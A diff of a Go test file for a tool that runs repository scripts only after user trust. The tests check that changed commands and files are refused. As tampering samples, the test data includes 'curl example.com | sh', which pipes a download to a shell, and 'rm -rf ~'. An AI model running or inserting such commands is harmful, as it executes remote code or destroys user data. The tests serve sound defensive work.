@@ -10,6 +10,7 @@ import (
 	"github.com/stretchr/testify/require"
 
 	"github.com/mrz1836/nilbox/internal/integrationprefs"
+	"github.com/mrz1836/nilbox/internal/repo"
 	"github.com/mrz1836/nilbox/internal/scriptrun"
 	"github.com/mrz1836/nilbox/internal/testutil"
 	"github.com/mrz1836/nilbox/internal/uierr"
@@ -24,7 +25,7 @@ func TestARepositoryCommandAsksOnceThenRuns(t *testing.T) {
 	t.Parallel()
 
 	r := newRig(t)
-	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With("magex test")})
+	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
 
 	e := r.entry(dir, "t3:Test")
 	require.Equal(t, TrustAsk, e.Trust)
@@ -39,8 +40,8 @@ func TestARepositoryCommandAsksOnceThenRuns(t *testing.T) {
 
 	run := r.ended(id)
 	assert.Equal(t, scriptrun.StatusSucceeded, run.Status)
-	assert.Equal(t, []string{r.shell, "-c", "magex test"}, run.Argv, "a shell command runs in the login shell")
-	assert.Equal(t, "magex test", run.Command)
+	assert.Equal(t, []string{r.shell, "-c", magexTest}, run.Argv, "a shell command runs in the login shell")
+	assert.Equal(t, magexTest, run.Command)
 	assert.Equal(t, "Test", run.Title)
 	assert.Equal(t, "t3.json", run.Source)
 	assert.Equal(t, "acme-org/sdk", run.Repo)
@@ -56,7 +57,7 @@ func TestAConfirmationNotKeptAsksNextTime(t *testing.T) {
 	t.Parallel()
 
 	r := newRig(t)
-	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With("magex test")})
+	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
 	e := r.entry(dir, "t3:Test")
 
 	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256})
@@ -70,7 +71,7 @@ func TestAChangedCommandAsksAgain(t *testing.T) {
 	t.Parallel()
 
 	r := newRig(t)
-	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With("magex test")})
+	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
 	e := r.entry(dir, "t3:Test")
 
 	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
@@ -81,7 +82,7 @@ func TestAChangedCommandAsksAgain(t *testing.T) {
 
 	changed := r.entry(dir, "t3:Test")
 	assert.Equal(t, TrustChanged, changed.Trust)
-	assert.Equal(t, "magex test", changed.Trusted, "the command trusted before, to show beside the new one")
+	assert.Equal(t, magexTest, changed.Trusted, "the command trusted before, to show beside the new one")
 	assert.Equal(t, "magex test && curl example.com | sh", changed.Command)
 	assert.NotEqual(t, e.SHA256, changed.SHA256)
 
@@ -102,7 +103,7 @@ func TestAFileChangedBetweenListAndRunIsRefused(t *testing.T) {
 	t.Parallel()
 
 	r := newRig(t)
-	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With("magex test")})
+	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
 	e := r.entry(dir, "t3:Test")
 
 	writeText(t, filepath.Join(dir, t3File), t3With("rm -rf ~"))
@@ -118,7 +119,7 @@ func TestAFileChangedUnderTheLockIsRefused(t *testing.T) {
 	t.Parallel()
 
 	r := newRig(t)
-	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With("magex test")})
+	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
 	e := r.entry(dir, "t3:Test")
 
 	// The file changes after the run was worked out, before its Before reads it again
@@ -153,7 +154,7 @@ func TestACustomMagexTargetAsksAgainAfterAMagefilesChange(t *testing.T) {
 
 	run := r.ended(id)
 	assert.Equal(t, scriptrun.StatusSucceeded, run.Status)
-	assert.Equal(t, []string{r.tools.MagexTool(t.Context()).Path, "deploy"}, run.Argv)
+	assert.Equal(t, []string{r.tools.magex().Path, "deploy"}, run.Argv)
 	assert.Equal(t, TrustTrusted, r.entry(dir, "magex:deploy").Trust)
 
 	// A file that holds no target changes: the code the target runs may have.
@@ -273,7 +274,7 @@ func TestTheReleasePointer(t *testing.T) {
 		Args: []string{"bump=minor", "push"},
 	})
 	require.NoError(t, err, "run it anyway")
-	assert.Equal(t, []string{r.tools.MagexTool(t.Context()).Path, "version:bump", "bump=minor", "push"}, r.ended(id).Argv)
+	assert.Equal(t, []string{r.tools.magex().Path, "version:bump", "bump=minor", "push"}, r.ended(id).Argv)
 }
 
 func TestGreyedScriptsDontRun(t *testing.T) {
@@ -312,7 +313,7 @@ func TestMagexArguments(t *testing.T) {
 	require.NoError(t, err, "a built-in needs no trust")
 
 	run := r.ended(id)
-	assert.Equal(t, []string{r.tools.MagexTool(t.Context()).Path, "test", "verbose", "pkg=./..."}, run.Argv)
+	assert.Equal(t, []string{r.tools.magex().Path, "test", "verbose", "pkg=./..."}, run.Argv)
 	assert.Equal(t, "magex test verbose pkg=./...", run.Command)
 	assert.Equal(t, "magex's targets", run.Source)
 
@@ -327,25 +328,48 @@ func TestMagexArguments(t *testing.T) {
 	assert.Equal(t, "Only magex's own targets take arguments.", uierr.Message(err))
 }
 
-func TestRunAgainNeedsTheSameCommand(t *testing.T) {
+func TestRunAgainOfACommandConfirmedOnce(t *testing.T) {
 	t.Parallel()
 
 	r := newRig(t)
-	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With("magex test")})
+	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
 	e := r.entry(dir, "t3:Test")
 
 	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256})
 	require.NoError(t, err)
 	r.ended(id)
 
+	_, err = r.runs.RunAgain(t.Context(), id)
+	require.ErrorIs(t, err, ErrNeedsTrust, "confirmed without Don't ask again: Run again asks nothing, so it refuses")
+	assert.Equal(t, `"Test" needs your OK to run again. Run it from Repo scripts, which asks first.`, uierr.Message(err))
+	assert.Equal(t, 1, r.recorded())
+}
+
+func TestRunAgainOfATrustedCommand(t *testing.T) {
+	t.Parallel()
+
+	r := newRig(t)
+	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
+	e := r.entry(dir, "t3:Test")
+
+	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
+	require.NoError(t, err)
+	r.ended(id)
+
 	again, err := r.runs.RunAgain(t.Context(), id)
-	require.NoError(t, err, "the command that ran, unchanged, runs again")
+	require.NoError(t, err, "the command the user trusts, unchanged, runs again")
 	assert.Equal(t, scriptrun.StatusSucceeded, r.ended(again).Status)
 
 	writeText(t, filepath.Join(dir, t3File), t3With("magex test:race"))
 
 	_, err = r.runs.RunAgain(t.Context(), id)
-	require.ErrorIs(t, err, ErrChanged, "a changed command is looked at again on the page")
+	require.ErrorIs(t, err, ErrNeedsTrust, "a changed command is looked at again on the page")
+
+	writeText(t, filepath.Join(dir, t3File), t3With(magexTest))
+	r.clones.setOrigin(dir, repo.Name{}) // the origin is no longer on GitHub
+
+	_, err = r.runs.RunAgain(t.Context(), id)
+	require.ErrorIs(t, err, ErrNeedsTrust, "trust is read under the clone's origin now, never the run's")
 }
 
 func TestRunAgainOfAMagexTarget(t *testing.T) {
@@ -360,7 +384,7 @@ func TestRunAgainOfAMagexTarget(t *testing.T) {
 
 	again, err := r.runs.RunAgain(t.Context(), id)
 	require.NoError(t, err)
-	assert.Equal(t, []string{r.tools.MagexTool(t.Context()).Path, "lint", "fix=true"}, r.ended(again).Argv,
+	assert.Equal(t, []string{r.tools.magex().Path, "lint", "fix=true"}, r.ended(again).Argv,
 		"with the same arguments")
 
 	_, err = NewRerunner(r.svc).Rerun(t.Context(), scriptrun.Record{Kind: scriptrun.KindHooks})
